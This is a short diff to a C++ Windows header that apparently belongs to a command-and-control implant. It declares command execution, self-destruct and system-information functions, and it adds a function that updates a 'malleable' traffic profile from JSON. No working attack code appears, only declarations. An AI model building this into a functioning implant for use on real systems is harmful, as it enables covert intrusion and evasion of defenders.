@@ -4,6 +4,8 @@
 #include <windows.h>
 #include <string>
 #include <vector>
+#include "profile.h"
+
 
 /**
  * Functions for command line execution
@@ -20,5 +22,10 @@ void SelfDestruct();
  * Get basic system information about this system
 */
 std::string SysInfo();
+
+/**
+ * Takes in a JSON object of changes to make to the profile and updates the profile
+*/
+void UpdateProfile(rapidjson::Value* changes, MalleableProfile* currentProfile);
 
 #endif
